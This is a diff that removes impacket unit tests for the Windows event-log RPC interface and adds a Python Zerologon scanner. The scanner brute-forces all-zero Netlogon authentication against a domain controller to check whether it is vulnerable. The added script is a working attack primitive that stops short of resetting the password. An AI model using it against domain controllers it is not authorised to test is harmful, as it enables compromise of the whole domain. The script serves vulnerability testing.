@@ -1,169 +1,127 @@
-###############################################################################
-#  Tested so far:
-#  EvtRpcRegisterLogQuery
-#  hEvtRpcRegisterLogQuery
-#  EvtRpcQueryNext
-#  hEvtRpcQueryNext
-###############################################################################
-
-from __future__ import division
-from __future__ import print_function
-import unittest
-try:
-    import ConfigParser
-except ImportError:
-    import configparser as ConfigParser
-
+from argparse import ArgumentParser
+from impacket.dcerpc.v5 import nrpc, epm
 from impacket.dcerpc.v5 import transport
-from impacket.dcerpc.v5 import epm, even6
+import os
+
+import sys
+
+# Give up brute-forcing after this many attempts. If vulnerable, 256 attempts are expected to be neccessary on average.
 from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_LEVEL_PKT_PRIVACY
-from impacket.structure import hexdump
+
+MAX_ATTEMPTS = 2000  # False negative chance: 0.04%
 
 
-class EVEN6Tests(unittest.TestCase):
-    def connect(self, version):
-        rpctransport = transport.DCERPCTransportFactory(self.stringBinding)
-        if len(self.hashes) > 0:
-            lmhash, nthash = self.hashes.split(':')
-        else:
-            lmhash = ''
-            nthash = ''
-        if hasattr(rpctransport, 'set_credentials'):
-            # This method exists only for selected protocol sequences.
-            rpctransport.set_credentials(self.username, self.password, self.domain, lmhash, nthash)
-        dce = rpctransport.get_dce_rpc()
-        dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
-        dce.connect()
-        if version == 1:
-            dce.bind(even6.MSRPC_UUID_EVEN6, transfer_syntax=self.ts)
-        else:
-            dce.bind(even6.MSRPC_UUID_EVEN6, transfer_syntax=self.ts)
+def fail(msg):
+    print(msg, file=sys.stderr)
+    print('This might have been caused by invalid arguments or network issues.', file=sys.stderr)
+    sys.exit(2)
 
-        return dce, rpctransport
 
-    def test_EvtRpcRegisterLogQuery_EvtRpcQueryNext(self):
-        dce, rpctransport = self.connect(2)
-
-        request = even6.EvtRpcRegisterLogQuery()
-        request['Path'] = 'Security\x00'
-        request['Query'] = '*\x00'
-        request['Flags'] = even6.EvtQueryChannelName | even6.EvtReadNewestToOldest
-
-        request.dump()
-        try:
-            resp = dce.request(request)
-            resp.dump()
-        except Exception as e:
-            return
-
-        log_handle = resp['Handle']
-
-        request = even6.EvtRpcQueryNext()
-        request['LogQuery'] = log_handle
-        request['NumRequestedRecords'] = 5
-        request['TimeOutEnd'] = 1000
-        request['Flags'] = 0
-        request.dump()
-        try:
-            resp = dce.request(request)
-            resp.dump()
-        except Exception as e:
-            return
-
-        for i in range(resp['NumActualRecords']):
-            event_offset = resp['EventDataIndices'][i]['Data']
-            event_size = resp['EventDataSizes'][i]['Data']
-            event = resp['ResultBuffer'][event_offset:event_offset + event_size]
-            buff = b''.join(event)
-            print(hexdump(buff))
-
-    def test_hEvtRpcRegisterLogQuery_hEvtRpcQueryNext(self):
-        dce, rpctransport = self.connect(2)
-
-        try:
-            resp = even6.hEvtRpcRegisterLogQuery(dce, 'Security\x00', '*\x00', even6.EvtQueryChannelName | even6.EvtReadNewestToOldest)
-            resp.dump()
-        except Exception as e:
-            return
-
-        log_handle = resp['Handle']
-
-        try:
-            resp = even6.EvtRpcQueryNext(dce, log_handle, 5, 1000, 0)
-            resp.dump()
-        except Exception as e:
-            return
-
-        for i in range(resp['NumActualRecords']):
-            event_offset = resp['EventDataIndices'][i]['Data']
-            event_size = resp['EventDataSizes'][i]['Data']
-            event = resp['ResultBuffer'][event_offset:event_offset + event_size]
-            buff = ''.join([x.encode('hex') for x in event]).decode('hex')
-            print(hexdump(buff))
-
-class SMBTransport(EVEN6Tests):
-    def setUp(self):
-        EVEN6Tests.setUp(self)
-        configFile = ConfigParser.ConfigParser()
-        configFile.read('dcetests.cfg')
-        self.username = configFile.get('SMBTransport', 'username')
-        self.domain = configFile.get('SMBTransport', 'domain')
-        self.serverName = configFile.get('SMBTransport', 'servername')
-        self.password = configFile.get('SMBTransport', 'password')
-        self.machine = configFile.get('SMBTransport', 'machine')
-        self.hashes = configFile.get('SMBTransport', 'hashes')
-        self.stringBinding = r'ncacn_np:%s[\PIPE\eventlog]' % self.machine
-        self.ts = ('8a885d04-1ceb-11c9-9fe8-08002b104860', '2.0')
-
-class SMBTransport64(EVEN6Tests):
-    def setUp(self):
-        EVEN6Tests.setUp(self)
-        configFile = ConfigParser.ConfigParser()
-        configFile.read('dcetests.cfg')
-        self.username = configFile.get('SMBTransport', 'username')
-        self.domain = configFile.get('SMBTransport', 'domain')
-        self.serverName = configFile.get('SMBTransport', 'servername')
-        self.password = configFile.get('SMBTransport', 'password')
-        self.machine = configFile.get('SMBTransport', 'machine')
-        self.hashes = configFile.get('SMBTransport', 'hashes')
-        self.stringBinding = r'ncacn_np:%s[\PIPE\eventlog]' % self.machine
-        self.ts = ('71710533-BEBA-4937-8319-B5DBEF9CCC36', '1.0')
-
-class TCPTransport(EVEN6Tests):
-    def setUp(self):
-        EVEN6Tests.setUp(self)
-        configFile = ConfigParser.ConfigParser()
-        configFile.read('dcetests.cfg')
-        self.username = configFile.get('TCPTransport', 'username')
-        self.domain = configFile.get('TCPTransport', 'domain')
-        self.serverName = configFile.get('TCPTransport', 'servername')
-        self.password = configFile.get('TCPTransport', 'password')
-        self.machine = configFile.get('TCPTransport', 'machine')
-        self.hashes = configFile.get('TCPTransport', 'hashes')
-        self.stringBinding = epm.hept_map(self.machine, even6.MSRPC_UUID_EVEN6, protocol='ncacn_ip_tcp')
-        self.ts = ('8a885d04-1ceb-11c9-9fe8-08002b104860', '2.0')
-
-class TCPTransport64(EVEN6Tests):
-    def setUp(self):
-        EVEN6Tests.setUp(self)
-        configFile = ConfigParser.ConfigParser()
-        configFile.read('dcetests.cfg')
-        self.username = configFile.get('TCPTransport', 'username')
-        self.domain = configFile.get('TCPTransport', 'domain')
-        self.serverName = configFile.get('TCPTransport', 'servername')
-        self.password = configFile.get('TCPTransport', 'password')
-        self.machine = configFile.get('TCPTransport', 'machine')
-        self.hashes = configFile.get('TCPTransport', 'hashes')
-        self.stringBinding = epm.hept_map(self.machine, even6.MSRPC_UUID_EVEN6, protocol='ncacn_ip_tcp')
-        self.ts = ('71710533-BEBA-4937-8319-B5DBEF9CCC36', '1.0')
-
-# Process command-line arguments.
-if __name__ == '__main__':
-    import sys
-    if len(sys.argv) > 1:
-        testcase = sys.argv[1]
-        suite = unittest.TestLoader().loadTestsFromTestCase(globals()[testcase])
+def try_zero_authenticate(dc_handle, dc_ip, target_computer,domain,user,password,test_type,privacy):
+    # Connect to the DC's Netlogon service.
+    if 'rpc' in test_type:
+        binding = epm.hept_map(dc_ip, nrpc.MSRPC_UUID_NRPC, protocol='ncacn_ip_tcp')
     else:
-        suite = unittest.TestLoader().loadTestsFromTestCase(TCPTransport)
-        suite.addTests(unittest.TestLoader().loadTestsFromTestCase(TCPTransport64))
-    unittest.TextTestRunner(verbosity=1).run(suite)
+        binding = r'ncacn_np:%s[\PIPE\netlogon]' % dc_ip
+
+    rpctransport = transport.DCERPCTransportFactory(binding)
+
+    if 'smb' in test_type:
+        if hasattr(rpctransport, 'set_credentials'):
+            username = user
+            if not username:
+                username = target_computer
+            # This method exists only for selected protocol sequences.
+            rpctransport.set_credentials(user, password, domain, '', '')
+
+    dce = rpctransport.get_dce_rpc()
+    if privacy:
+        dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
+
+    dce.connect()
+    dce.bind(nrpc.MSRPC_UUID_NRPC)
+
+    # Use an all-zero challenge and credential.
+
+    finaly_rand_byte = os.urandom(1)
+
+    plaintext = b'\x00' * 7 + finaly_rand_byte
+    ciphertext = b'\x00' * 7 + finaly_rand_byte
+
+    # Standard flags observed from a Windows 10 client (including AES), with only the sign/seal flag disabled.
+    flags = 0x212fffff
+
+    # Send challenge and authentication request.
+    nrpc.hNetrServerReqChallenge(dce, dc_handle + '\x00', target_computer + '\x00', plaintext)
+    try:
+        server_auth = nrpc.hNetrServerAuthenticate3(
+            dce, dc_handle + '\x00', target_computer + '$\x00',
+            nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,
+                     target_computer + '\x00', ciphertext, flags
+        )
+
+        # It worked!
+        assert server_auth['ErrorCode'] == 0
+        return dce
+
+    except nrpc.DCERPCSessionError as ex:
+        # Failure should be due to a STATUS_ACCESS_DENIED error. Otherwise, the attack is probably not working.
+        if ex.get_error_code() == 0xc0000022:
+            return None
+        else:
+            fail(f'Unexpected error code from DC: {ex.get_error_code()}.')
+    except BaseException as ex:
+        fail(f'Unexpected error: {ex}.')
+
+
+def perform_attack(dc_handle, dc_ip, target_computer,domain,user,password,test_type,privacy):
+    # Keep authenticating until succesfull. Expected average number of attempts needed: 256.
+    print('Performing authentication attempts...')
+    rpc_con = None
+    for attempt in range(0, MAX_ATTEMPTS):
+        rpc_con = try_zero_authenticate(dc_handle, dc_ip, target_computer,domain,user,password,test_type,privacy)
+
+        if rpc_con == None:
+            print('=', end='', flush=True)
+        else:
+            break
+
+    if rpc_con:
+        print('\nSuccess! DC can be fully compromised by a Zerologon attack.')
+    else:
+        print('\nAttack failed. Target is probably patched.')
+        sys.exit(1)
+
+def parse_args():
+    parser = ArgumentParser(prog=ArgumentParser().prog,prefix_chars="-/",add_help=False,description=f'Perform zerologon test over RPC/TCP or RPC/SMB')
+
+    parser.add_argument('-h','--help','/?','/h','/help',action='help',help='show this help message and exit')
+    parser.add_argument("dc_name", help="NetBIOS name of the domain controller", type=str)
+    parser.add_argument("dc_ip", help="ip address of the domain controller", type=str)
+    parser.add_argument("-u", "--user", dest='user', metavar='', help="authenticated domain user,may be required for SMB", type=str,default="")
+    parser.add_argument("-d", "--domain", dest='domain', metavar='',
+                        help="domain name, required only when authentication over SMB", type=str, default="")
+    parser.add_argument("-p", "--pass", dest='password', metavar='', help="authenticated domain user's password, may be required for SMB", type=str,default="")
+    parser.add_argument("-t", "--type", metavar="", dest="test_type", choices=["smb","rpc"], default="smb",
+                        help="rpc or smb scan. choices: [%(choices)s], (default: 'smb').")
+    parser.add_argument("-pp","--privacy", dest="privacy", action="store_true",help="if exists adds packet privacy")
+
+    args = parser.parse_args()
+
+    return args
+
+
+if __name__ == '__main__':
+    args = parse_args()
+
+    dc_name = args.dc_name
+    dc_ip = args.dc_ip
+    user = args.user
+    password = args.password
+    test_type = args.test_type
+    domain = args.domain
+    privacy = args.privacy
+
+
+    dc_name = dc_name.rstrip('$')
+    perform_attack('\\\\' + dc_name, dc_ip, dc_name,domain,user,password,test_type,privacy)
